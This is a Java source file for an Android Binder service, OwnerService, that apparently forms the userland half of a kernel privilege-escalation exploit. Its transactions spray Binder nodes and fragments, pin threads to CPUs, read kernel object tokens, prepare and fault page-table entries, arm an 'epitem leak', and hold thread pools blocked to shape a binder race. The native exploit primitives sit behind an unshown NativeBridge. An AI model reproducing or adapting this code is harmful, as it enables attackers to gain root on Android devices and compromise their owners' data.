package com.vandam.prism;

import android.app.Service;
import android.content.Intent;
import android.os.Binder;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Semaphore;
import java.util.concurrent.atomic.AtomicInteger;

public class OwnerService extends Service {
    static final String EXTRA_NONCE = "owner-terminal-nonce";
    static final String EXTRA_BOOT_ID = "owner-terminal-boot-id";
    static final String EXTRA_TERMINAL_CLEANUP =
            "owner-terminal-cleanup";
    static final String DESCRIPTOR = "com.vandam.prism.Owner";
    static final int TRANSACTION_TOKENS = IBinder.FIRST_CALL_TRANSACTION;
    static final int TRANSACTION_HOLD = IBinder.FIRST_CALL_TRANSACTION + 1;
    static final int TRANSACTION_STATE = IBinder.FIRST_CALL_TRANSACTION + 2;
    static final int TRANSACTION_COHORT = IBinder.FIRST_CALL_TRANSACTION + 3;
    static final int TRANSACTION_COHORT_TOKENS =
            IBinder.FIRST_CALL_TRANSACTION + 4;
    static final int TRANSACTION_PREPARE_PTES =
            IBinder.FIRST_CALL_TRANSACTION + 5;
    static final int TRANSACTION_FAULT_PTES =
            IBinder.FIRST_CALL_TRANSACTION + 6;
    static final int TRANSACTION_TRIGGER_CHECK =
            IBinder.FIRST_CALL_TRANSACTION + 7;
    static final int TRANSACTION_CALIBRATION =
            IBinder.FIRST_CALL_TRANSACTION + 8;
    static final int TRANSACTION_ARM_EPITEM_LEAK =
            IBinder.FIRST_CALL_TRANSACTION + 9;
    static final int TRANSACTION_FRAGMENT_BATCH =
            IBinder.FIRST_CALL_TRANSACTION + 10;
    static final int TRANSACTION_BLOCK_POOL =
            IBinder.FIRST_CALL_TRANSACTION + 11;
    static final int TRANSACTION_CONTROLLED_NODE =
            IBinder.FIRST_CALL_TRANSACTION + 12;
    static final int TRANSACTION_CONTROLLED_TOKENS =
            IBinder.FIRST_CALL_TRANSACTION + 13;
    static final int TRANSACTION_FILLER_NODES =
            IBinder.FIRST_CALL_TRANSACTION + 14;
    static final int TRANSACTION_RETAIN_ANCHOR =
            IBinder.FIRST_CALL_TRANSACTION + 15;
    static final int TRANSACTION_TERMINAL_RETIRE =
            IBinder.FIRST_CALL_TRANSACTION + 16;
    static final int TRANSACTION_PID =
            IBinder.FIRST_CALL_TRANSACTION + 17;
    static final int TRANSACTION_IDENTITY =
            IBinder.FIRST_CALL_TRANSACTION + 18;
    static final int COHORT_SIZE = 1152;
    static final int FRAGMENT_COUNT = 4096;
    static final int FRAGMENT_TRANSACTION_COUNT = 2304;
    static final int FILLER_REF_COUNT = 1536;
    static final int TRANSACTION_FRAGMENT_HOLD = 0x4265;
    static final int TRANSACTION_CONTROLLED_HOLD = 0x4266;
    static final int SELECTED_INDEX = 0;
    static final int TRANSACTION_NODE_HOLD = 0x4448;

    private static volatile OwnerService activeInstance;
    private volatile CountDownLatch release = new CountDownLatch(1);
    private volatile boolean resetWatcherRunning;
    private volatile boolean terminalCleanup;
    private volatile String terminalNonce = "";
    private volatile String terminalBootId = "";
    private volatile long terminalStartTime = -1;
    private Thread resetWatcher;
    private final Semaphore selectedRelease = new Semaphore(0);
    private final AtomicInteger held = new AtomicInteger();
    private final AtomicInteger selectedHeld = new AtomicInteger();
    private final AtomicInteger selectedCompleted = new AtomicInteger();
    private final AtomicInteger activeBlockers = new AtomicInteger();
    private final Binder[] cohort = new Binder[COHORT_SIZE];
    private final Binder[] fragments = new Binder[FRAGMENT_COUNT];
    private final Binder[] fillerRefNodes = new Binder[FILLER_REF_COUNT];
    private Binder controlledNode = new Binder() {
        {
            attachInterface(null, "com.vandam.prism.ControlledNode");
        }
    };
    private IBinder retainedAnchor;

    private Binder calibration = new Binder() {
        {
            attachInterface(null, "com.vandam.prism.Calibration");
        }
    };

    private final class NodeBinder extends Binder {
        private final int index;

        NodeBinder(int index) {
            this.index = index;
            attachInterface(null, "com.vandam.prism.Node." + index);
        }

        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply,
                                     int flags) throws RemoteException {
            if (index == SELECTED_INDEX && code == TRANSACTION_NODE_HOLD) {
                NativeBridge.pinCurrentThread(6);
                int entry = selectedHeld.incrementAndGet();
                try {
                    selectedRelease.acquire();
                } catch (InterruptedException exception) {
                    Thread.currentThread().interrupt();
                }
                selectedCompleted.incrementAndGet();
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    }

    private final Binder owner = new Binder() {
        {
            attachInterface(null, ownerDescriptor());
        }

        @Override
        protected boolean onTransact(int code, Parcel data, Parcel reply,
                                     int flags) throws RemoteException {
            if (code == TRANSACTION_HOLD) {
                held.incrementAndGet();
                try {
                    CountDownLatch currentRelease = release;
                    currentRelease.await();
                } catch (InterruptedException exception) {
                    Thread.currentThread().interrupt();
                }
                return true;
            }
            if (code == TRANSACTION_STATE) {
                reply.writeNoException();
                reply.writeInt(held.get());
                reply.writeInt(selectedHeld.get());
                return true;
            }
            if (code == TRANSACTION_TOKENS) {
                long[] tokens = NativeBridge.ownerTokens(this);
                reply.writeNoException();
                reply.writeLong(tokens[0]);
                reply.writeLong(tokens[1]);
                return true;
            }
            if (code == TRANSACTION_COHORT) {
                int ownerCpu = NativeBridge.pinCurrentThread(6);
                reply.writeNoException();
                reply.writeInt(COHORT_SIZE);
                reply.writeInt(ownerCpu);
                for (int index = 0; index < COHORT_SIZE; index++) {
                    if (cohort[index] == null) {
                        cohort[index] = new NodeBinder(index);
                    }
                    reply.writeStrongBinder(cohort[index]);
                }
                return true;
            }
            if (code == TRANSACTION_COHORT_TOKENS) {
                reply.writeNoException();
                reply.writeInt(COHORT_SIZE);
                for (int index = 0; index < COHORT_SIZE; index++) {
                    long[] tokens = NativeBridge.ownerTokens(cohort[index]);
                    reply.writeLong(tokens[0]);
                    reply.writeLong(tokens[1]);
                }
                return true;
            }
            if (code == TRANSACTION_PREPARE_PTES) {
                int pinned = NativeBridge.pinAllThreads(6);
                String state = NativeBridge.preparePtePlan();
                reply.writeNoException();
                reply.writeString(state + " pinned_threads=" + pinned);
                return true;
            }
            if (code == TRANSACTION_FAULT_PTES) {
                NativeBridge.pinCurrentThread(6);
                reply.writeNoException();
                reply.writeString(NativeBridge.faultPtePlan());
                return true;
            }
            if (code == TRANSACTION_TRIGGER_CHECK) {
                int targetCompleted = selectedCompleted.get() + 1;
                selectedRelease.release();
                for (int attempt = 0; attempt < 200 &&
                        (selectedCompleted.get() < targetCompleted ||
                         (targetCompleted < 129 &&
                          selectedHeld.get() < targetCompleted + 1));
                        attempt++) {
                    try {
                        Thread.sleep(10);
                    } catch (InterruptedException exception) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
                NativeBridge.pinCurrentThread(0);
                String state = NativeBridge.checkPtePlan();
                reply.writeNoException();
                reply.writeString(state + " first_completed=" +
                        selectedCompleted.get() + " selected_entered=" +
                        selectedHeld.get() + " retained=" +
                        Math.max(0, 129 - selectedCompleted.get()));
                return true;
            }
            if (code == TRANSACTION_CALIBRATION) {
                reply.writeNoException();
                reply.writeStrongBinder(calibration);
                return true;
            }
            if (code == TRANSACTION_ARM_EPITEM_LEAK) {
                reply.writeNoException();
                reply.writeInt(NativeBridge.armEpitemLeakOwner(
                        getFilesDir().getAbsolutePath()) ? 1 : 0);
                return true;
            }
            if (code == TRANSACTION_FRAGMENT_BATCH) {
                int ownerCpu = data.readInt();
                NativeBridge.pinCurrentThread(ownerCpu);
                reply.writeNoException();
                reply.writeInt(FRAGMENT_COUNT);
                for (int index = 0; index < FRAGMENT_COUNT; index++) {
                    if (fragments[index] == null) {
                        fragments[index] = new Binder();
                    }
                    reply.writeStrongBinder(fragments[index]);
                }
                return true;
            }
            if (code == TRANSACTION_BLOCK_POOL) {
                CountDownLatch currentRelease = release;
                activeBlockers.incrementAndGet();
                try {
                    currentRelease.await();
                } catch (InterruptedException exception) {
                    Thread.currentThread().interrupt();
                } finally {
                    activeBlockers.decrementAndGet();
                }
                return true;
            }
            if (code == TRANSACTION_CONTROLLED_NODE) {
                reply.writeNoException();
                reply.writeStrongBinder(controlledNode);
                return true;
            }
            if (code == TRANSACTION_CONTROLLED_TOKENS) {
                long[] tokens = NativeBridge.ownerTokens(controlledNode);
                reply.writeNoException();
                reply.writeLong(tokens[0]);
                reply.writeLong(tokens[1]);
                return true;
            }
            if (code == TRANSACTION_FILLER_NODES) {
                reply.writeNoException();
                reply.writeInt(FILLER_REF_COUNT);
                for (int index = 0; index < FILLER_REF_COUNT; index++) {
                    if (fillerRefNodes[index] == null) {
                        fillerRefNodes[index] = new Binder();
                    }
                    reply.writeStrongBinder(fillerRefNodes[index]);
                }
                return true;
            }
            if (code == TRANSACTION_RETAIN_ANCHOR) {
                retainedAnchor = data.readStrongBinder();
                reply.writeNoException();
                reply.writeInt(retainedAnchor != null ? 1 : 0);
                return true;
            }
            if (code == TRANSACTION_TERMINAL_RETIRE) {
                int expectedPid = data.readInt();
                long expectedStartTime = data.readLong();
                int expectedCallerPid = data.readInt();
                long expectedCallerStartTime = data.readLong();
                String expectedNonce = data.readString();
                String expectedBootId = data.readString();
                boolean hostHelperRetired = data.readInt() == 1;
                int callerPid = Binder.getCallingPid();
                int callerUid = Binder.getCallingUid();
                boolean valid = (flags & IBinder.FLAG_ONEWAY) != 0 &&
                        callerUid == 0 &&
                        callerPid > 0 &&
                        callerPid != android.os.Process.myPid() &&
                        callerPid == expectedCallerPid &&
                        expectedCallerStartTime > 0 &&
                        ProcessIdentity.readStartTime(callerPid) ==
                                expectedCallerStartTime &&
                        terminalCleanup &&
                        expectedPid == android.os.Process.myPid() &&
                        expectedStartTime ==
                                ProcessIdentity.currentStartTime() &&
                        terminalNonce.equals(expectedNonce) &&
                        terminalBootId.equals(expectedBootId) &&
                        terminalBootId.equals(currentBootId()) &&
                        hostHelperRetired;
                if (!valid) {
                    String rejection = "status=fail" +
                            " stage=owner-terminal-retirement" +
                            " reason=identity" +
                            " caller_uid=" + callerUid +
                            " caller_pid=" + callerPid +
                            " expected_caller_pid=" + expectedCallerPid +
                            " caller_start_time=" +
                            ProcessIdentity.readStartTime(callerPid) +
                            " expected_caller_start_time=" +
                            expectedCallerStartTime;
                    writeResult(new File(getFilesDir(),
                            "owner-terminal-retirement.result"), rejection);
                    return false;
                }
                String state = "status=pass" +
                        " stage=owner-terminal-retirement" +
                        " nonce=" + terminalNonce +
                        " owner_pid=" + android.os.Process.myPid() +
                        " owner_start_time=" + terminalStartTime +
                        " boot_id=" + terminalBootId +
                        " self_exit=1";
                writeResult(new File(getFilesDir(),
                        "owner-terminal-retirement.result"), state);
                releaseOwnedReferences();
                new Thread(() -> android.os.Process.killProcess(
                        android.os.Process.myPid()),
                        "owner-terminal-retire").start();
                return true;
            }
            if (code == TRANSACTION_PID) {
                reply.writeNoException();
                reply.writeInt(android.os.Process.myPid());
                return true;
            }
            if (code == TRANSACTION_IDENTITY) {
                reply.writeNoException();
                reply.writeInt(android.os.Process.myPid());
                reply.writeLong(ProcessIdentity.currentStartTime());
                return true;
            }
            return super.onTransact(code, data, reply, flags);
        }
    };

    protected String ownerDescriptor() {
        return DESCRIPTOR;
    }

    @Override
    public IBinder onBind(Intent intent) {
        boolean requestedTerminal = intent != null &&
                intent.getBooleanExtra(EXTRA_TERMINAL_CLEANUP, false);
        if (requestedTerminal) {
            String nonce = intent.getStringExtra(EXTRA_NONCE);
            String bootId = intent.getStringExtra(EXTRA_BOOT_ID);
            long startTime = ProcessIdentity.currentStartTime();
            if (nonce == null || !nonce.matches("[0-9a-f]{32}") ||
                    bootId == null || !bootId.matches(
                            "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-" +
                            "[0-9a-f]{4}-[0-9a-f]{12}") ||
                    !bootId.equals(currentBootId()) || startTime <= 0) {
                return null;
            }
            terminalNonce = nonce;
            terminalBootId = bootId;
            terminalStartTime = startTime;
            terminalCleanup = true;
        }
        return owner;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        activeInstance = this;
        resetWatcherRunning = true;
        resetWatcher = new Thread(this::watchForBlockerReset,
                "owner-blocker-reset");
        resetWatcher.setDaemon(true);
        resetWatcher.start();
    }

    private void watchForBlockerReset() {
        File request = new File(getFilesDir(), "blockers-reset.request");
        File ready = new File(getFilesDir(), "blockers-reset.ready");
        File saturated = new File(getFilesDir(),
                "blockers-saturated.ready");
        File cleanupRequest = new File(getFilesDir(),
                "owner-fragments-cleanup.request");
        File cleanupReady = new File(getFilesDir(),
                "owner-fragments-cleanup.ready");
        File terminalRequest = new File(getFilesDir(),
                "owner-terminal-retire");
        File terminalTrigger = new File(getFilesDir(),
                "owner-terminal-retire.trigger");
        File terminalResult = new File(getFilesDir(),
                "owner-terminal-retirement.result");
        while (resetWatcherRunning) {
            if (activeBlockers.get() >= 15 && !saturated.exists()) {
                try (FileOutputStream stream = new FileOutputStream(
                        saturated, false)) {
                    stream.write(("status=pass active=" +
                            activeBlockers.get() + "\n").getBytes(
                            StandardCharsets.UTF_8));
                } catch (Exception ignored) {
                }
            }
            if (cleanupRequest.exists()) {
                cleanupRequest.delete();
                String state = NativeBridge.cleanupOwnerFragmentBuffers();
                try (FileOutputStream stream = new FileOutputStream(
                        cleanupReady, false)) {
                    stream.write((state + "\n").getBytes(
                            StandardCharsets.UTF_8));
                } catch (Exception ignored) {
                }
            }
            if (request.exists()) {
                request.delete();
                boolean reset = releaseAndResetBlockers();
                try (FileOutputStream stream = new FileOutputStream(
                        ready, false)) {
                    stream.write(("status=" + (reset ? "pass" : "fail") +
                            "\n").getBytes(StandardCharsets.UTF_8));
                } catch (Exception ignored) {
                }
            }
            if (terminalCleanup && terminalTrigger.exists()) {
                String expected = "nonce=" + terminalNonce +
                        " owner_pid=" + android.os.Process.myPid() +
                        " owner_start_time=" + terminalStartTime +
                        " boot_id=" + terminalBootId +
                        " host_helper_retired=1";
                String observed = readSmall(terminalRequest);
                if (!observed.isEmpty()) {
                    boolean valid = expected.equals(observed) &&
                            terminalBootId.equals(currentBootId());
                    if (!valid) {
                        String rejection = "status=fail" +
                                " stage=owner-terminal-retirement" +
                                " reason=request-identity";
                        writeResult(terminalResult, rejection);
                        return;
                    }
                    releaseOwnedReferences();
                    String state = "status=pass" +
                            " stage=owner-terminal-retirement" +
                            " nonce=" + terminalNonce +
                            " owner_pid=" + android.os.Process.myPid() +
                            " owner_start_time=" + terminalStartTime +
                            " boot_id=" + terminalBootId +
                            " self_exit=1";
                    writeResult(terminalResult, state);
                    android.os.Process.killProcess(
                            android.os.Process.myPid());
                    return;
                }
            }
            try {
                Thread.sleep(10);
            } catch (InterruptedException exception) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    static boolean releaseAndResetBlockers() {
        OwnerService instance = activeInstance;
        if (instance == null) {
            return false;
        }
        for (int pass = 0; pass < 8; pass++) {
            synchronized (instance) {
                CountDownLatch oldRelease = instance.release;
                instance.release = new CountDownLatch(1);
                oldRelease.countDown();
            }
            for (int attempt = 0;
                 attempt < 500 && instance.activeBlockers.get() != 0;
                 attempt++) {
                try {
                    Thread.sleep(10);
                } catch (InterruptedException exception) {
                    Thread.currentThread().interrupt();
                    return false;
                }
            }
            if (instance.activeBlockers.get() != 0) {
                return false;
            }
            try {
                Thread.sleep(100);
            } catch (InterruptedException exception) {
                Thread.currentThread().interrupt();
                return false;
            }
            if (instance.activeBlockers.get() == 0) {
                return true;
            }
        }
        return false;
    }

    private void releaseOwnedReferences() {
        activeInstance = null;
        retainedAnchor = null;
        for (int index = 0; index < cohort.length; index++) {
            cohort[index] = null;
        }
        for (int index = 0; index < fragments.length; index++) {
            fragments[index] = null;
        }
        for (int index = 0; index < fillerRefNodes.length; index++) {
            fillerRefNodes[index] = null;
        }
        controlledNode = null;
        calibration = null;
        resetWatcherRunning = false;
        if (resetWatcher != null) {
            resetWatcher.interrupt();
            resetWatcher = null;
        }
        release.countDown();
        selectedRelease.release(129);
    }

    @Override
    public void onDestroy() {
        if (!terminalCleanup) {
            releaseOwnedReferences();
        } else {
            release.countDown();
            selectedRelease.release(129);
        }
        super.onDestroy();
    }

    private static String readSmall(File file) {
        try {
            return new String(Files.readAllBytes(file.toPath()),
                    StandardCharsets.UTF_8).trim();
        } catch (Exception exception) {
            return "";
        }
    }

    private static String currentBootId() {
        return readSmall(new File("/proc/sys/kernel/random/boot_id"));
    }

    private static void writeResult(File file, String value) {
        File temporary = new File(file.getParentFile(),
                file.getName() + ".tmp." + android.os.Process.myPid() +
                        "." + android.os.Process.myTid());
        try {
            try (FileOutputStream stream =
                         new FileOutputStream(temporary, false)) {
                stream.write((value + "\n").getBytes(
                        StandardCharsets.UTF_8));
                stream.getFD().sync();
            }
            Files.move(temporary.toPath(), file.toPath(),
                    StandardCopyOption.ATOMIC_MOVE,
                    StandardCopyOption.REPLACE_EXISTING);
        } catch (Exception ignored) {
            temporary.delete();
        }
    }
}
